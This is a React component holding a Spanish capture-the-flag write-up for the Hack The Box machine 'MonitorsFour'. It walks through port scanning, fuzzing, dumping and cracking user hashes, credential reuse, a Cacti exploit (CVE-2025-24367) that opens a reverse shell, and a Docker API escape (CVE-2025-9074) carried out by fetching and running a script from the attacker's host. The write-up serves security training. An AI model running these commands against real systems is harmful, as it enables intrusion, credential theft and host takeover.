import React from "react";
import { useImageLightbox } from "@/components/ImageLightbox";

export default function MonitorsFour() {
  const { LightboxImage, LightboxOverlay } = useImageLightbox();

  return (
    <>
      <LightboxOverlay />
      <article className="prose prose-invert">
      <br />
      <LightboxImage src="/images/Blog/Miniaturas/monitorfour.png" alt="MonitorFour machine thumbnail" className="mx-auto" />
      <br />
      <p><strong>Descripción:</strong> MonitorFour es una máquina de dificultad fácil enfocada en explotación web y escalada en un entorno Windows/WSL2. El desafío combina enumeración de servicios,
       descubrimiento de virtual hosts, explotación de una aplicación Cacti vulnerable y escape de un contenedor Docker expuesto.</p>
      <br />
      <p>En este writeup mostramos el flujo completo desde la identificación de dominios y recursos web hasta la explotación y el acceso a las flags de usuario y root.</p>
      <br />

      <strong>Enumeración</strong>
      <p>Comenzamos con un escaneo inicial de puertos usando <code>nmap</code>:</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`nmap -p- -n -Pn --open -sS --min-rate 2000 {IP}`}</pre>
      <br />
      <p>Parámetros:</p>
      <ul>
        <li><code>-p-</code> escanea todos los puertos</li>
        <li><code>-n</code> evita resolución DNS</li>
        <li><code>-Pn</code> no realiza descubrimiento de hosts</li>
        <li><code>--open</code> muestra solo puertos abiertos</li>
        <li><code>-sS</code> SYN stealth scan</li>
        <li><code>--min-rate 2000</code> velocidad mínima de paquetes</li>
      </ul>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/MonitorsFour_HTB/Enumeracion/enumeracion_1.png" alt="nmap first scan" className="mx-auto" />
      <br />

      <p>Se detectaron los puertos 80 y 5985 abiertos. Luego realizamos un escaneo más detallado:</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`nmap -p80,5985 -sCV -n -Pn {IP}`}</pre>
      <br />

      <p>Parámetros:</p>
      <ul>
        <li><code>-p80,5985</code> escanea los puertos especificados</li>
        <li><code>-sCV</code> Realiza escaneo de versiones y scripts</li>
        </ul>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/MonitorsFour_HTB/Enumeracion/enumeracion_2.png" alt="nmap second scan" className="mx-auto" />
      <br />

      <p>Recordemos que debemos añadir al <code>/etc/hosts</code> la IP de la máquina para resolver el dominio <code>monitorsfour.htb</code>.</p>
      <br />
      
      <p>Vemos que sobre el puerto 80 está corriendo un servidor web por http y cuenta con las siguientes tecnologías ( ver utilizando la extensión Wappalyzer ):</p>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/MonitorsFour_HTB/Enumeracion/enumeracion_3.png" alt="nmap second scan" className="mx-auto" />
      <br />

      <p>Luego accedemos a http://monitorsfour.htb y vemos un sitio web sobre soluciones de red para empresas. Investigamos un poco en él, pero no se encuentra nada interesante.</p>
      <br />

      <p>Por lo que procedemos a hacer fuzzing para ver si encontramos algún recurso interesante.</p>
      <br />

      <pre className="rounded bg-muted p-4 overflow-auto">{`ffuf -w /usr/share/SecLists/Discovery/Web-Content/common.txt -u http://monitorsfour.htb/FUZZ`}</pre>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/MonitorsFour_HTB/Enumeracion/enumeracion_4.png" alt="whatweb scan" className="mx-auto" />
      <br />

      <p>Vemos que obtenemos varios recursos, sin embargo luego de analizar cada uno de ellos le vamos a prestar atención a /user. </p>
      <br />
      
      <p>Al acceder a /user vemos que el servidor nos responde con un error pidiéndonos un token en la petición.</p>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/MonitorsFour_HTB/Enumeracion/enumeracion_5.png" alt="whatweb scan" className="mx-auto" />
      <br />

      <p>Luego de probar un poco con parámetros como cmd, id, token y valores básicos vemos lo siguiente:</p>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/MonitorsFour_HTB/Enumeracion/enumeracion_6.png" alt="whatweb scan" className="mx-auto" />
      <br />

      <p>Dumpeando información sobre usuarios, correos, hashes de contraseñas, etc de la aplicación. Copiamos rápidamente los pares de usuario/contraseña que encontramos e intentamos
        crackear los hashes, normalmente suelo usar <a href="https://crackstation.net" target="_blank" rel="noopener noreferrer">Crackstation</a> que es una herramienta online muy simple y efectiva</p>
      <br />
         

      <LightboxImage src="/images/Blog/Máquinas/MonitorsFour_HTB/Enumeracion/enumeracion_7.png" alt="whatweb scan" className="mx-auto" />
      <br />

      <p>Revelando la contraseña del primer hash que es wonderful1, que esta pertenece al usuario admin. Con este par de credenciales podemos acceder al sistema.</p>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/MonitorsFour_HTB/Enumeracion/enumeracion_8.png" alt="whatweb scan" className="mx-auto" />
      <br />

      <p>Sin embargo no vemos gran cosa de cara a vulneración de la máquina en sí, sino un dashboard con datos de la empresa, de usuarios y clientes.</p>
      <br />

      <p>Seguimos haciendo fuzzing esta vez de vhosts/subdominios:</p>
      <br />

      <pre className="rounded bg-muted p-4 overflow-auto">{`ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://monitorsfour.htb/ -H Host:FUZZ.monitorsfour.htb -fs 138`}</pre>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/MonitorsFour_HTB/Enumeracion/enumeracion_9.png" alt="web interface" className="mx-auto" />   
      <br />

      <p>Vemos que obtenemos un subdominio válido en este caso <code>cacti.monitorsfour.htb</code>. Lo añadimos a <code>/etc/hosts</code> igual que hicimos con el dominio principal y luego accedemos a él.</p>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/MonitorsFour_HTB/Enumeracion/enumeracion_10.png" alt="api enumeration" className="mx-auto" />
      <br />

      <p>Probamos nuestro par de credenciales <strong>admin:wonderful1</strong> y no funcionan. Podemos aprovechar el resto de usuarios y nombres que obtuvimos (ver en la última captura de Burp Suite) e intentar combinaciones de estos con la propia contraseña
       para ver si hay reutilización de contraseñas.
      </p>
      <br />      
      
      <ul>
        <li>-mwatson</li>
        <li>-janderson</li>
        <li>-dthompson</li>
        <li>-marcus</li>
        <li>-michael</li>
        <li>-jennifer</li>
        <li>-david</li>
      </ul>
      <br />

      <p>Y tenemos la suerte que el par de credenciales <strong>marcus:wonderful1</strong> sí funciona, por lo que tenemos acceso a esta nueva interfaz web. Esta aplicación se llama Cacti y es una
       herramienta de monitoreo de red.</p>
      <br />

      <p>Luego que logramos acceder al sistema vemos que nos dice la versión del software arriba a la derecha.</p> 
      <br />

      <LightboxImage src="/images/Blog/Máquinas/MonitorsFour_HTB/Enumeracion/enumeracion_11.png" alt="api enumeration" className="mx-auto" />
      <br/>

      <p>Investigamos un poco sobre el Cacti y esta versión en específico y vemos que presenta una vulnerabilidad conocida (CVE-2025-24367).</p> 
      <br />

      <LightboxImage src="/images/Blog/Máquinas/MonitorsFour_HTB/Enumeracion/enumeracion_12.png" alt="api enumeration" className="mx-auto" />
      <br/>

      <p>A continuación dejo el enlace a una de las pruebas de concepto para esta vulnerabilidad,   
        <a href="https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC" target="_blank" rel="noopener noreferrer"> Enlace aquí.</a></p> 
      <br />

      <strong>Explotación</strong>
      <p>Nos descargamos el exploit.py  y le ajustamos los parámetros:</p>
      <br />

      <pre className="rounded bg-muted p-4 overflow-auto">{`python3 exploit.py -u marcus -p wonderful1 -i {Nuestra_IP} -l 4444 -url http://cacti.monitorsfour.htb`}</pre>
      <br />

      <p>Nos ponemos en escucha con la herramienta <a href="https://github.com/brightio/penelope" target="_blank" rel="noopener noreferrer">Penelope</a>:</p>
      <br />

      <pre className="rounded bg-muted p-4 overflow-auto">{`penelope.py`}</pre>
      <br />

      <p>Y lanzamos el exploit:</p>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/MonitorsFour_HTB/Explotacion/explotacion_1.png" alt="web interface" className="mx-auto" />
      <br />

      <p>Y estamos dentro del sistema. Nos movemos al directorio personal de marcus y tenemos la primera flag</p>
      <br />

      <pre className="rounded bg-muted p-4 overflow-auto">{`cat /home/marcus/user.txt`}</pre>
      <br />


      <LightboxImage src="/images/Blog/Máquinas/MonitorsFour_HTB/Explotacion/explotacion_2.png" alt="web interface" className="mx-auto" />
      <br />

      <p>Luego podemos pasar a leer archivos de configuración de la aplicación, a los cuales tenemos acceso, cabe recordar que estamos frente a una máquina Windows por lo que al estar ejecutando
        comandos de Linux probablemente estemos dentro de un Docker.</p>
      <br />

      <pre className="rounded bg-muted p-4 overflow-auto">{`uname -a`}</pre>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/MonitorsFour_HTB/Explotacion/explotacion_3.png" alt="web interface" className="mx-auto" />
      <br />

      <p>Vemos que la máquina está utilizando WSL2, una tecnología de Microsoft para ejecutar Linux en Windows, y además vemos un número que parece un ID de contenedor (821fbd6a43fa). Por lo tanto, el reto ahora es escapar del contenedor para poder escalar privilegios.</p>
      <br />

      <p>[ Windows Host ] → [ WSL2 Linux Kernel ] → [ Docker Container ] → [ www-data (donde estamos)]</p>
      <br />


      <p>Luego de investigar al respecto sobre las tecnologías que usa y probar varios exploits dí con lo siguiente:</p>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/MonitorsFour_HTB/Escalada/escalada_1.png" alt="registration form" className="mx-auto" />
      <br />

      <strong>Escalada de Privilegios</strong>
      <p>Comprobamos que la API de docker está activa:</p>
      <br />
      
      <pre className="rounded bg-muted p-4 overflow-auto">{`curl http://192.168.65.7:2375/version`}</pre>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/MonitorsFour_HTB/Escalada/escalada_2.png" alt="api user invite" className="mx-auto" />
      <br />
      
      <p>Vemos que efectivamente nos responde, por lo que vamos a intentar explotar dicha vulnerabilidad (CVE-2025-9074). Donde los pasos son básicamente crear un contenedor con privilegios elevados, iniciarlo, 
      luego montarnos la unidad de almacenamiento del host( la de Windows en este caso ) en nuestro contenedor y poder acceder a los archivos del host.</p>
      <br />

      <p>Para esto me creé un script en bash para facilitar el proceso: <a href="https://github.com/chernandez321/CVE-2025-9074-docker-escape" target="_blank" rel="noopener noreferrer">CVE-2025-9074-docker-escape</a></p>
      <br />

      <p>Lo descargamos y lo transferimos a la máquina, le damos permisos de ejecución y lo lanzamos:</p>
      <br />

      <p>En nuestra máquina:</p>
      <pre className="rounded bg-muted p-4 overflow-auto">{`python3 -m http.server 8000`}</pre>
      <br />
    
      <p>En el servidor:</p>
      <pre className="rounded bg-muted p-4 overflow-auto">{`wget http://<TU_IP>:8000/escape.sh
chmod +x escape.sh
./escape.sh`}</pre>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/MonitorsFour_HTB/Escalada/escalada_3.png" alt="api user invite" className="mx-auto" />
      <br />

      <p>Vemos que efectivamente tenemos acceso al sistema de almacenamiento del host desde nuestro contenedor y procedemos a leer la flag:</p>
      <br />
      
      <pre className="rounded bg-muted p-4 overflow-auto">{`cat /mnt/host/mnt/host/c/Users/Administrator/Desktop/root.txt`}</pre>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/MonitorsFour_HTB/Escalada/escalada_4.png" alt="api user invite" className="mx-auto" />
      <br/>

      <strong>Conclusiones</strong>
      <p>MonitorsFour es un laboratorio que permite practicar: enumeración web, descubrimiento de virtual hosts, explotación de una aplicación Cacti vulnerable y escalada 
        de privilegios a través de un contenedor Docker expuesto en WSL2. Comenzamos con un escaneo de puertos y descubrimos los dominios <code>monitorsfour.htb</code> y 
        <code> cacti.monitorsfour.htb</code>, explotamos la vulnerabilidad en Cacti para obtener acceso inicial y luego aprovechamos la API de Docker para escapar del contenedor y 
        leer la flag de administrador.</p>
    </article>
    </>
  );
}